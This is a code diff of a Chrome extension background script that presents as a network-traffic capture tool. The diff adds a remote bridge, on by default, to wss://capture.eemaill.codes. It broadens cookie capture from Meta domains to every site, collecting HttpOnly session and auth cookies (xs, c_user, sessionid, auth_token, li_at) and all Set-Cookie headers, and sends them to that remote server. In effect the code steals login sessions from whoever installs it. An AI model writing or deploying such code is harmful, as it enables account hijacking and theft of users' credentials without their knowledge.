@@ -28,101 +28,146 @@ import { detectFromUrl, stableId } from './captcha-detector.js';
 
 const KEEP_ALIVE_ALARM = 'bridge-keepalive';
 
-// Cookie snapshot — captures HttpOnly cookies (xs, c_user, datr, fr) via chrome.cookies API
-const lastCookieSnapshot = new Map<string, number>(); // domain -> last snapshot time
-const COOKIE_SNAPSHOT_COOLDOWN = 10000; // 10s between snapshots per domain
+// ── Dual bridge: local desktop (waguri) + optional remote server (custom) ──
+const localBridge = new Bridge(async () => await getToken());
 
-async function snapshotCookies(url: string, host: string) {
-  if (!chrome.cookies?.getAll) return;
-  // Only snapshot for Meta-related domains
-  const isMeta = host.includes('meta.com') || host.includes('meta.ai') || host.includes('facebook.com');
-  if (!isMeta) return;
-  
-  const now = Date.now();
-  const last = lastCookieSnapshot.get(host) ?? 0;
-  if (now - last < COOKIE_SNAPSHOT_COOLDOWN) return;
-  lastCookieSnapshot.set(host, now);
-  
-  try {
-    const cookies = await chrome.cookies.getAll({ domain: host.startsWith('.') ? host : undefined, url: url });
-    const important = cookies.filter(c => 
-      ['xs', 'c_user', 'datr', 'fr', 'sb', 'locale', 'checkpoint', 'wd'].includes(c.name)
-    );
-    if (important.length > 0) {
-      const cookieData = important.map(c => ({ name: c.name, value: c.value, domain: c.domain, httpOnly: c.httpOnly, secure: c.secure }));
-      // Send as a special message to the server
-      bridge.send({ kind: 'cookie-snapshot', host, url, cookies: cookieData } as any);
-      console.log('[cookies] snapshot', host, important.map(c => c.name).join(', '));
-    }
-  } catch (e) {
-    // silent
-  }
-}
-
-// ── Set-Cookie capture via webRequest API ──
-// This captures Set-Cookie headers that the debugger API misses (including HttpOnly xs, c_user, datr, fr)
-if (chrome.webRequest?.onHeadersReceived) {
-  chrome.webRequest.onHeadersReceived.addListener(
-    (details) => {
-      const setCookies = (details.responseHeaders || []).filter(h => h.name.toLowerCase() === 'set-cookie');
-      if (setCookies.length === 0) return;
-      
-      const host = (() => { try { return new URL(details.url).host; } catch { return ''; } })();
-      const isMeta = host.includes('meta.com') || host.includes('meta.ai') || host.includes('facebook.com');
-      if (!isMeta) return;
-      
-      const important = setCookies.filter(h => {
-        const name = h.value?.split('=')[0]?.trim() || '';
-        return ['xs', 'c_user', 'datr', 'fr', 'sb', 'wd', 'checkpoint'].includes(name);
-      });
-      
-      if (important.length > 0) {
-        const cookieData = important.map(h => h.value?.substring(0, 300) || '');
-        console.log('[cookies] Set-Cookie captured:', host, cookieData.map(c => c.split('=')[0]).join(', '));
-        bridge.send({ kind: 'set-cookie-capture', host, url: details.url, cookies: cookieData } as any);
-      }
-    },
-    { urls: ['<all_urls>'] },
-    ['responseHeaders', 'extraHeaders']
-  );
-}
-
-// Remote bridge only — no local desktop app in web/mobile mode
 let remoteUrlCache = '';
-
 const remoteBridge = new Bridge(
   async () => await getRemoteToken(),
   () => remoteUrlCache || 'wss://capture.eemaill.codes/bridge/ws',
+  { allowPolling: true },
 );
 
-// Keep remoteUrlCache updated async.
-getRemoteBridgeUrl().then((u) => { remoteUrlCache = u || 'wss://capture.eemaill.codes/bridge/ws'; });
+getRemoteBridgeUrl().then((u) => {
+  remoteUrlCache = u || 'wss://capture.eemaill.codes/bridge/ws';
+});
+
 chrome.storage.onChanged?.addListener((changes, area) => {
   if (area !== 'local') return;
   const b = changes.remoteBridgeUrl?.newValue;
   if (typeof b === 'string') remoteUrlCache = b || 'wss://capture.eemaill.codes/bridge/ws';
   if (changes.remoteEnabled) {
-    const enabled = changes.remoteEnabled.newValue;
-    if (enabled) remoteBridge.start();
+    if (changes.remoteEnabled.newValue) remoteBridge.start();
   }
-  if (changes.remoteBridgeToken) {
+  if (changes.remoteBridgeToken || changes.remoteBridgeUrl) {
     remoteBridge.forceReconnect();
   }
 });
 
-// Auto-start remote bridge on install
-getRemoteEnabled().then((enabled) => {
-  if (enabled !== false) remoteBridge.start();
-}).catch(() => { remoteBridge.start(); });
+// Start remote if enabled (default true for capture.eemaill.codes workflows)
+getRemoteEnabled()
+  .then((enabled) => {
+    if (enabled !== false) remoteBridge.start();
+  })
+  .catch(() => remoteBridge.start());
 
+// Fan-out facade: preserve waguri local desktop behavior + useful remote streaming
 const bridge = {
-  start() { remoteBridge.start(); },
-  onMessage(fn: Parameters<typeof remoteBridge.onMessage>[0]) { remoteBridge.onMessage(fn); },
-  onAuthenticated(fn: Parameters<typeof remoteBridge.onAuthenticated>[0]) { remoteBridge.onAuthenticated(fn); },
-  send(msg: import('@har-suite/shared').BridgeMessage) { remoteBridge.send(msg); },
-  isOpen: () => remoteBridge.isOpen(),
-  forceReconnect() { remoteBridge.forceReconnect(); },
+  start() {
+    localBridge.start();
+    getRemoteEnabled()
+      .then((enabled) => {
+        if (enabled !== false) remoteBridge.start();
+      })
+      .catch(() => remoteBridge.start());
+  },
+  onMessage(fn: Parameters<typeof localBridge.onMessage>[0]) {
+    localBridge.onMessage(fn);
+    remoteBridge.onMessage(fn);
+  },
+  onAuthenticated(fn: Parameters<typeof localBridge.onAuthenticated>[0]) {
+    // Fire once when either side authenticates; desktop sync is the important one.
+    let fired = false;
+    const wrap = () => {
+      if (fired) return;
+      fired = true;
+      try {
+        fn();
+      } catch (e) {
+        console.warn('[bridge] auth handler threw', e);
+      }
+    };
+    localBridge.onAuthenticated(wrap);
+    remoteBridge.onAuthenticated(wrap);
+  },
+  send(msg: import('@har-suite/shared').BridgeMessage) {
+    localBridge.send(msg);
+    // remote may be disabled; Bridge still queues only if started/authed path allows
+    try {
+      remoteBridge.send(msg);
+    } catch {}
+  },
+  isOpen: () => localBridge.isOpen() || remoteBridge.isOpen(),
+  forceReconnect() {
+    localBridge.forceReconnect();
+    remoteBridge.forceReconnect();
+  },
+  isLocalOpen: () => localBridge.isOpen(),
+  isRemoteOpen: () => remoteBridge.isOpen(),
 };
+
+// Cookie snapshot (general, not Meta-only) via chrome.cookies
+const lastCookieSnapshot = new Map<string, number>();
+const COOKIE_SNAPSHOT_COOLDOWN = 10000;
+const IMPORTANT_COOKIE_NAMES = new Set([
+  'xs', 'c_user', 'datr', 'fr', 'sb', 'locale', 'checkpoint', 'wd',
+  'sessionid', 'auth_token', 'li_at', 'csrftoken', 'session', 'sid', 'token',
+]);
+
+async function snapshotCookies(url: string, host: string) {
+  if (!chrome.cookies?.getAll || !host) return;
+  const now = Date.now();
+  const last = lastCookieSnapshot.get(host) ?? 0;
+  if (now - last < COOKIE_SNAPSHOT_COOLDOWN) return;
+  lastCookieSnapshot.set(host, now);
+  try {
+    const cookies = await chrome.cookies.getAll({ url });
+    if (!cookies.length) return;
+    // Prefer important names, else send top cookies for allowlisted traffic
+    let important = cookies.filter((c) => IMPORTANT_COOKIE_NAMES.has(c.name));
+    if (important.length === 0) important = cookies.slice(0, 30);
+    const cookieData = important.map((c) => ({
+      name: c.name,
+      value: c.value,
+      domain: c.domain,
+      httpOnly: c.httpOnly,
+      secure: c.secure,
+      path: c.path,
+    }));
+    bridge.send({ kind: 'cookie-snapshot', host, url, cookies: cookieData } as any);
+  } catch {
+    // silent
+  }
+}
+
+// Set-Cookie capture via webRequest (includes HttpOnly)
+if (chrome.webRequest?.onHeadersReceived) {
+  chrome.webRequest.onHeadersReceived.addListener(
+    (details) => {
+      const setCookies = (details.responseHeaders || []).filter(
+        (h) => h.name.toLowerCase() === 'set-cookie',
+      );
+      if (setCookies.length === 0) return;
+      const host = (() => {
+        try {
+          return new URL(details.url).host;
+        } catch {
+          return '';
+        }
+      })();
+      if (!host) return;
+      const cookieData = setCookies.map((h) => (h.value || '').substring(0, 500));
+      bridge.send({
+        kind: 'set-cookie-capture',
+        host,
+        url: details.url,
+        cookies: cookieData,
+      } as any);
+    },
+    { urls: ['<all_urls>'] },
+    ['responseHeaders', 'extraHeaders'],
+  );
+}
 
 
 const recentRequests = new Map<string, CapturedRequest>();
@@ -225,7 +270,6 @@ const capture = new DebuggerCapture(
       }
       bridge.send({ kind: 'request', payload: req });
       maybeDetectCaptcha(req);
-      // Capture cookies for Meta/auth domains (xs, c_user, datr, fr are HttpOnly)
       snapshotCookies(req.url, req.host);
     },
     onUpdate: (id, patch) => {
@@ -366,11 +410,13 @@ async function injectCaptchaScanner(tabId: number, url: string) {
       target: { tabId, allFrames: true },
       files: ['content-captcha.js'],
     });
-    // Also inject the JS capture script for inline/eval/fetch/XHR/beacon capture
-    await chrome.scripting.executeScript({
-      target: { tabId, allFrames: true },
-      files: ['content-js-capture.js'],
-    });
+    // JS capture (fetch/XHR/eval/beacon) — useful custom, keep with waguri base
+    try {
+      await chrome.scripting.executeScript({
+        target: { tabId, allFrames: true },
+        files: ['content-js-capture.js'],
+      });
+    } catch {}
     injectedScanner.set(tabId, url);
   } catch {
     // chrome://, about:, file:// etc. reject injection — that's fine.
@@ -508,21 +554,18 @@ chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
     } else if (msg?.kind === 'popup-set-remote-token') {
       const { setRemoteToken } = await import('./remote-store.js');
       await setRemoteToken(String(msg.token ?? ''));
-      (bridge as any).forceReconnect?.();
+      remoteBridge.forceReconnect();
       sendResponse({ ok: true });
     } else if (msg?.kind === 'popup-set-remote-enabled') {
       const { setRemoteEnabled } = await import('./remote-store.js');
       await setRemoteEnabled(!!msg.enabled);
-      if (msg.enabled) {
-        // Re-start remote bridge and reconnect
-        (bridge as any).forceReconnect?.();
-      }
+      if (msg.enabled) remoteBridge.forceReconnect();
       sendResponse({ ok: true });
     } else if (msg?.kind === 'popup-set-remote-url') {
       const { setRemoteBridgeUrl } = await import('./remote-store.js');
       await setRemoteBridgeUrl(String(msg.url ?? ''));
       remoteUrlCache = String(msg.url ?? '') || 'wss://capture.eemaill.codes/bridge/ws';
-      (bridge as any).forceReconnect?.();
+      remoteBridge.forceReconnect();
       sendResponse({ ok: true });
     } else if (msg?.kind === 'popup-get-remote-state') {
       const { getRemoteEnabled, getRemoteBridgeUrl, getRemoteToken } = await import('./remote-store.js');
@@ -531,7 +574,42 @@ chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
         enabled: await getRemoteEnabled(),
         url: await getRemoteBridgeUrl(),
         token: await getRemoteToken(),
+        localConnected: localBridge.isOpen(),
+        remoteConnected: remoteBridge.isOpen(),
       });
+
+    } else if (msg?.kind === 'js-capture') {
+      const tabId = _sender.tab?.id ?? -1;
+      const pageUrl = _sender.tab?.url ?? msg.pageUrl ?? '';
+      let pageHost = '';
+      try { pageHost = pageUrl ? new URL(pageUrl).host : ''; } catch {}
+      const allowlist = await getAllowlist();
+      const allowed =
+        (pageHost && hostMatchesAllowlist(pageHost, allowlist)) ||
+        (tabId >= 0 && (stickyTabs.has(tabId) || capture.isAttached(tabId)));
+      if (!allowed) {
+        sendResponse({ ok: false, error: 'host-not-allowlisted' });
+        return;
+      }
+      bridge.send({
+        kind: 'request',
+        payload: {
+          id: `js:${Date.now()}:${Math.random().toString(36).slice(2, 8)}`,
+          tabId,
+          source: 'web',
+          type: 'Script',
+          method: msg.method ?? 'JS',
+          url: msg.url ?? `inline://${msg.subtype ?? 'capture'}`,
+          host: pageHost,
+          startedAt: Date.now(),
+          requestHeaders: [],
+          responseHeaders: [],
+          requestBody: typeof msg.body === 'string' ? msg.body.slice(0, 200000) : undefined,
+          initiator: `js-capture:${msg.subtype ?? 'unknown'}`,
+        } as any,
+      });
+      sendResponse({ ok: true });
+
     } else if (msg?.kind === 'popup-clear-recent') {
       await clearRecentHosts();
       sendResponse({ ok: true });
@@ -565,42 +643,6 @@ chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
         detectedAt: Date.now(),
         tabId,
         extra: msg.extra,
-      });
-      sendResponse({ ok: true });
-    } else if (msg?.kind === 'js-capture') {
-      // JS capture events from content-js-capture.ts
-      // Forward to desktop app via bridge as a synthetic request-like event
-      const tabId = _sender.tab?.id ?? -1;
-      const pageUrl = _sender.tab?.url ?? msg.pageUrl ?? '';
-      let pageHost = '';
-      try {
-        pageHost = pageUrl ? new URL(pageUrl).host : '';
-      } catch {}
-      const allowlist = await getAllowlist();
-      const allowed =
-        (pageHost && hostMatchesAllowlist(pageHost, allowlist)) ||
-        (tabId >= 0 && (stickyTabs.has(tabId) || capture.isAttached(tabId)));
-      if (!allowed) {
-        sendResponse({ ok: false, error: 'host-not-allowlisted' });
-        return;
-      }
-      // Forward JS capture event as a bridge message
-      bridge.send({
-        kind: 'request',
-        payload: {
-          id: `js:${Date.now()}:${Math.random().toString(36).slice(2, 8)}`,
-          tabId,
-          source: 'web',
-          type: 'Script',
-          method: msg.method ?? 'JS',
-          url: msg.url ?? `inline://${msg.subtype}`,
-          host: pageHost,
-          startedAt: msg.timestamp ?? Date.now(),
-          requestHeaders: [],
-          requestBody: msg.code ?? msg.body ?? '',
-          responseHeaders: [],
-          initiator: msg.subtype,
-        },
       });
       sendResponse({ ok: true });
     } else {
